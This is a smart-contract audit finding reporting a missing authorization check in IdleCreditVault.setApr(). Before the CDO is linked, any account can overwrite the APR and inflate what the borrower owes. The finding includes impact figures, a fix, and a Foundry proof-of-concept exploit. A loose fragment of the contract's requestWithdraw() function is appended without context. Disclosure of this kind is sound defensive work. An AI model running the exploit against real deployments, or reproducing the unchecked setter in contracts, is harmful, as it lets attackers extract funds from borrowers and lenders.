### Title
Unauthenticated pre-link APR overwrite inflates borrower debt and LP claims - (File: contracts/strategies/idle/IdleCreditVault.sol)

### Summary

`IdleCreditVault.setApr()` skips authorization entirely while `idleCDO == address(0)`. Because `initialize()` cannot know the future CDO address, this creates a deployment-linking window in which any EOA can replace both `unscaledApr` and `lastApr` through `setAprs()`. The later CDO treats the attacker-supplied value as the configured APR and can pull an inflated interest obligation from the honest borrower. [1](#0-0) [2](#0-1) [3](#0-2) 

### Finding Description

`initialize()` stores an initial `lastApr` and `unscaledApr`, but leaves `idleCDO` unset until the owner subsequently calls `setWhitelistedCDO()`. During that interval, `setApr()` deliberately bypasses the CDO/manager check when `idleCDO` is zero; `setAprs()` and `setAprsWithBuffer()` also let the caller overwrite `unscaledApr` before reaching that open setter. [1](#0-0) [4](#0-3) [2](#0-1) [5](#0-4) 

For a default 30-day epoch and 5-day buffer, an attacker can set both APR fields to `17e18`; CDO initialization then scales that nominal 17% APR by `(30 + 5) / 30`, producing approximately `19.833e18`, still below the scaled `DEFAULT_MAX_APR` of `20e18`. If the intended nominal APR was `10e18`, the attacker raises the first epoch’s borrower interest from approximately 0.959% of NAV to approximately 1.63% of NAV—an extra 6,575 tokens on a 1,000,000-token vault. `startEpoch()` stores that value in `expectedEpochInterest`, and `stopEpoch()` pulls it from the borrower through `getFundsFromBorrower()`. [6](#0-5) [7](#0-6) [8](#0-7) 

The factory path deploys and configures these contracts atomically, including resetting the APR before whitelisting, so that path is not exploitable. The vulnerability remains in the production contract for separately deployed or upgraded/manual wiring flows where strategy initialization, CDO deployment, APR correction, and `setWhitelistedCDO()` are not atomic. [9](#0-8) 

### Impact Explanation

An attacker who becomes a KYC-passing LP before the first epoch can convert the manipulated APR into attacker-owned tranche yield paid by the borrower. If the borrower cannot or does not fund the inflated amount, `stopEpoch()` enters the default path and pauses the vault, leaving principal and withdrawals unavailable pending default recovery. [10](#0-9) [11](#0-10) 

On a 1,000,000-unit vault with a 30-day epoch and 5-day buffer, changing nominal APR from 10% to 17% creates approximately 6,575 additional units of borrower debt in the first epoch. The attacker can hold the appreciating tranche and later realize the inflated NAV through the normal withdrawal path. [12](#0-11) [13](#0-12) 

### Likelihood Explanation

Likelihood is deployment-flow dependent. The atomic factory overwrites the APR before linking, preventing interception, but manual deployment, migration, or operational wiring that leaves `idleCDO` unset across transactions exposes a public one-transaction overwrite. The attacker needs no privileged role and can deposit once the CDO is linked and before operators notice or correct the APR. [14](#0-13) [2](#0-1) 

### Recommendation

Do not use `idleCDO == address(0)` as an authorization bypass for unrestricted callers. Before linking, require `msg.sender == owner() || msg.sender == manager`; after linking, retain the existing CDO-or-manager check. Alternatively, require the CDO address in `initialize()` or make strategy/CDO wiring atomic and immutable.

```solidity
if (_cdo == address(0)) {
    if (msg.sender != owner() && msg.sender != manager) revert NotAllowed();
} else if (msg.sender != _cdo && msg.sender != manager) {
    revert NotAllowed();
}
```

Deployments should also assert the final `unscaledApr` and `getApr()` immediately after `setWhitelistedCDO()`.

### Proof of Concept

The following Foundry-style fork PoC demonstrates that an unprivileged account can overwrite the pre-link APR and that the CDO subsequently pulls inflated borrower interest.

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import {IdleCreditVault} from "../contracts/strategies/idle/IdleCreditVault.sol";
import {IdleCDOEpochVariant} from "../contracts/IdleCDOEpochVariant.sol";
import {IERC20Detailed} from "../contracts/interfaces/IERC20Detailed.sol";

contract PreLinkAprOverwritePoC is Test {
    using stdStorage for StdStorage;

    IERC20Detailed constant USDC =
        IERC20Detailed(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);

    IdleCreditVault strategy;
    IdleCDOEpochVariant cdo;

    address owner = makeAddr("owner");
    address manager = makeAddr("manager");
    address borrower = makeAddr("borrower");
    address attacker = makeAddr("attacker");
    address fees = makeAddr("fees");

    uint256 amount = 1_000_000e6;
    uint256 intendedApr = 10e18;
    uint256 maliciousApr = 17e18;
    uint256 duration = 30 days;
    uint256 buffer = 5 days;

    function test_attackerSetsAprBeforeCdoLink() public {
        vm.createSelectFork("mainnet");

        strategy = new IdleCreditVault();
        stdstore.target(address(strategy))
            .sig(strategy.token.selector)
            .checked_write(address(0));

        vm.prank(owner);
        strategy.initialize(
            address(USDC),
            owner,
            manager,
            borrower,
            "Borrower",
            intendedApr
        );

        // Unprivileged overwrite while idleCDO is still address(0).
        vm.prank(attacker);
        strategy.setAprs(maliciousApr, maliciousApr);

        cdo = new IdleCDOEpochVariant();
        stdstore.target(address(cdo))
            .sig(cdo.token.selector)
            .checked_write(address(0));

        // CDO initialization reads attacker-controlled getApr() and scales it.
        cdo.initialize(
            0,
            address(USDC),
            fees,
            owner,
            address(0),
            address(strategy),
            100_000
        );

        vm.prank(owner);
        strategy.setWhitelistedCDO(address(cdo));

        vm.startPrank(owner);
        cdo.setFeeParams(fees, 0, 0, 0);
        cdo.setEpochParams(duration, buffer);
        cdo.setKeyringParams(address(0), 0);
        vm.stopPrank();

        uint256 scaledAttackApr = strategy.getApr();
        assertEq(strategy.unscaledApr(), maliciousApr);
        assertEq(scaledAttackApr, maliciousApr * (duration + buffer) / duration);
        assertLe(scaledAttackApr, strategy.DEFAULT_MAX_APR());

        deal(address(USDC), attacker, amount);
        vm.startPrank(attacker);
        USDC.approve(address(cdo), amount);
        cdo.depositAA(amount);
        vm.stopPrank();

        vm.prank(manager);
        cdo.startEpoch();

        uint256 attackInterest = amount
            * (scaledAttackApr / 100)
            * duration
            / (365 days * 1e18);
        uint256 honestScaledApr =
            intendedApr * (duration + buffer) / duration;
        uint256 honestInterest = amount
            * (honestScaledApr / 100)
            * duration
            / (365 days * 1e18);

        assertEq(cdo.expectedEpochInterest(), attackInterest);
        assertGt(attackInterest, honestInterest);

        // Honest borrower is forced to pay the attacker-inflated obligation.
        deal(address(USDC), borrower, attackInterest);
        vm.prank(borrower);
        USDC.approve(address(cdo), attackInterest);

        uint256 borrowerBefore = USDC.balanceOf(borrower);
        vm.warp(cdo.epochEndDate() + 1);
        vm.prank(manager);
        cdo.stopEpoch(intendedApr, 0);

        assertEq(borrowerBefore - USDC.balanceOf(borrower), attackInterest);
        assertFalse(cdo.defaulted());
    }
}
```

  /// @notice Request a withdraw from the vault
  /// @param _amount Amount of tranche tokens 
  /// @param _tranche Tranche to withdraw from
  /// @return _underlyings Amount of underlyings requested
  function requestWithdraw(uint256 _amount, address _tranche) external returns (uint256 _underlyings) {
    _checkTranche(_tranche);
    _checkNotAllowed(
      (_tranche == AATranche ? !allowAAWithdrawRequest : !allowBBWithdrawRequest) ||
      !isWalletAllowed(msg.sender)
    );
  
    // we check if there are donated assets to the pool and transfer them to the feeReceiver if any
    _skimDonatedAssets();

    // we trigger an update accounting to check for eventual losses
    _updateAccounting();

    IdleCreditVault creditVault = IdleCreditVault(strategy);
    if (_amount == 0) {
      _amount = _userTrancheBal(msg.sender, _tranche);
    }
    _underlyings = _trancheToUnderlyings(_amount, _tranche);

    // Programmable borrower deployments do not support instant withdrawals.
    // If apr decresed wrt last epoch, request instant withdraw and burn tranche tokens directly
    // we compare unscaled aprs
    if (_isInstantWithdrawEnabled()) {
      uint256 currentApr = creditVault.unscaledApr();
      if (lastEpochApr > (currentApr + instantWithdrawAprDelta)) {
        // burn strategy tokens from cdo and mint an equal amount to msg.sender as receipt
        creditVault.requestInstantWithdraw(_underlyings, msg.sender);
        // burn tranche tokens and decrease NAV
        _withdrawOps(_amount, _underlyings, _tranche);
        return _underlyings;
      }
    }

    uint256 principal = _underlyings;
    (uint256 interest, int256 diff) = _calcInterestWithdrawRequest(_underlyings, _tranche);
    uint256 totalFees = _totalWithdrawFees(principal, interest);
    // user is requesting principal + interest minus upfront management fee and net performance fee
    _underlyings = principal + interest - totalFees;
    // add expected fees to pending withdraw fees counter
    pendingWithdrawFees += totalFees;

    /// if there is an AA withdrawal the overperformance that the amount withdrawed would have generated for BB tranches
    /// is saved in interestForOverUnderPerformance. This is used to calculate the interest that should be added to the
    /// expectedEpochInterest at the startEpoch.
    /// If there is a BB withdrawal this amount is subtracted from the expectedEpochInterest
    interestForOverUnderPerformance += diff;

    // The receipt is fixed now and leaves live NAV. Charge management fees upfront
    // for the time it waits outside live NAV: remaining buffer plus the next epoch.
    creditVault.requestWithdraw(_underlyings, msg.sender, principal);
    // burn tranche tokens and decrease NAV without interest for the next epoch as it was not yet counted in NAV
    _withdrawOps(_amount, principal, _tranche);
